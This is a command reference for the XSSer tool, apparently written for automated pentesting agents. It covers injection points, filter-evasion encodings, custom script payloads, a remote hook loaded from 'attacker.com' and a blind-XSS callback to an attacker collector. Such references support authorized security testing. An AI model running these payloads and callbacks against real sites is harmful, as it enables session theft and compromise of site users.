---
tool_name: xsser
category: exploitation
tags: [xss, cross-site-scripting, reflected-xss, stored-xss, dom-xss, encoding-bypass]
used_by_agents: [xss_agent, planner_agent]
---

# XSSer — Cross-Site Scripting Scanner & Exploiter

## What It Does
Automated XSS vulnerability detection and exploitation. Tests GET/POST parameters, headers, and cookies for reflected, stored, and DOM-based XSS. Includes encoding/evasion techniques to bypass WAFs and filters.

---

## Basic Scanning

### GET parameter
```bash
xsser -u "http://target.com/search.php?q=XSS" --auto
```

### POST parameter
```bash
xsser -u "http://target.com/login" --post "username=XSS&password=test" --auto
```

### With cookies
```bash
xsser -u "http://target.com/page.php?name=XSS" --cookie "PHPSESSID=abc123;security=low" --auto
```

### Verbose output
```bash
xsser -u "http://target.com/page.php?q=XSS" --auto -v
```

---

## Injection Points

### Header injection
```bash
xsser -u "http://target.com/page.php?q=XSS" --header "X-Forwarded-For: XSS" --auto
xsser -u "http://target.com/page.php?q=XSS" --referer "http://evil.com/XSS" --auto
xsser -u "http://target.com/page.php?q=XSS" --user-agent "XSS" --auto
```

---

## Encoding & Evasion

```bash
# String obfuscation
xsser -u "http://target.com/page.php?q=XSS" --auto --Str

# URL encoding
xsser -u "http://target.com/page.php?q=XSS" --auto --Une

# Hex encoding
xsser -u "http://target.com/page.php?q=XSS" --auto --Hex

# HTML entity encoding
xsser -u "http://target.com/page.php?q=XSS" --auto --Hes

# Double URL encoding
xsser -u "http://target.com/page.php?q=XSS" --auto --Dwo

# Base64 encoding
xsser -u "http://target.com/page.php?q=XSS" --auto --B64

# Multiple encodings chained
xsser -u "http://target.com/page.php?q=XSS" --auto --Str --Une --Hex
```

---

## Custom Payloads

```bash
# Final payload injection
xsser -u "http://target.com/page.php?q=XSS" --Fp "<script>alert(1)</script>"

# Replace payload
xsser -u "http://target.com/page.php?q=XSS" --Fr "<img src=x onerror=alert(1)>"

# Remote JS injection
xsser -u "http://target.com/page.php?q=XSS" --Jk "http://attacker.com/hook.js"
```

---

## Crawler Mode

```bash
# Crawl target and test found parameters
xsser -u "http://target.com" --crawling 2 --auto
xsser -u "http://target.com" --crawling 3 --auto --threads 10
```

---

## DOM XSS & Blind XSS

```bash
# DOM-based XSS detection
xsser -u "http://target.com/page.php?q=XSS" --Dom --auto

# Blind XSS (callback to attacker)
xsser -u "http://target.com/page.php?q=XSS" --Cp "http://attacker.com/collect.php"
```

---

## Reverse Check (Verification)

```bash
# Verify XSS by checking if payload executes (reverse connection)
xsser -u "http://target.com/page.php?q=XSS" --auto --reverse-check
```

---

## Performance

```bash
xsser -u "http://target.com/page.php?q=XSS" --auto --threads 10
xsser -u "http://target.com/page.php?q=XSS" --auto --timeout 30
xsser -u "http://target.com/page.php?q=XSS" --auto --delay 2
```

---

## Proxy & Output

```bash
xsser -u "http://target.com/page.php?q=XSS" --proxy "http://127.0.0.1:8080" --auto
xsser -u "http://target.com/page.php?q=XSS" --auto --xml "output.xml"
xsser -u "http://target.com/page.php?q=XSS" --auto --save
```

---

## Output Interpretation

### XSS found:
```
[+] XSS FOUND! [ VULNERABLE ]
[*] Target: http://target.com/page.php?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
[*] Payload: <script>alert(1)</script>
[*] Type: Reflected
[*] Browser(s): [IE7.0|IE6.0|NS8.1-IE|NS8.1-G|FF2.0]

=====================
Total XSS found: 1
=====================
```
**Success indicators**: `[+] XSS FOUND!`, `VULNERABLE`, `Total XSS found: N` where N > 0

### No XSS found:
```
=====================
Total XSS found: 0
=====================
```
**Failure indicators**: `Total XSS found: 0`

### Statistics summary:
```
=====================
Test(s) injected: 47
Successful: 1
Failed: 46
Total XSS found: 1
=====================
```

---

## Common Flags Reference

| Flag | Purpose |
|------|---------|
| `-u` | Target URL (XSS marks where to inject) |
| `--post` | POST data body |
| `--cookie` | Cookie string |
| `--auto` | Automatic mode (test all built-in payloads) |
| `--Fp` | Final payload to inject |
| `--Fr` | Replace payload |
| `--Jk` | Remote JavaScript file URL |
| `--Str` | String obfuscation encoding |
| `--Une` | URL encoding |
| `--Hex` | Hex encoding |
| `--Hes` | HTML entity encoding |
| `--Dwo` | Double URL encoding |
| `--B64` | Base64 encoding |
| `--Dom` | DOM XSS testing |
| `--Cp` | Blind XSS callback URL |
| `--crawling` | Crawler depth |
| `--reverse-check` | Verify XSS execution |
| `--threads` | Concurrent threads |
| `--timeout` | Request timeout (seconds) |
| `--delay` | Delay between requests |
| `--proxy` | Proxy URL |
| `--xml` | XML output file |
| `-v` | Verbose mode |
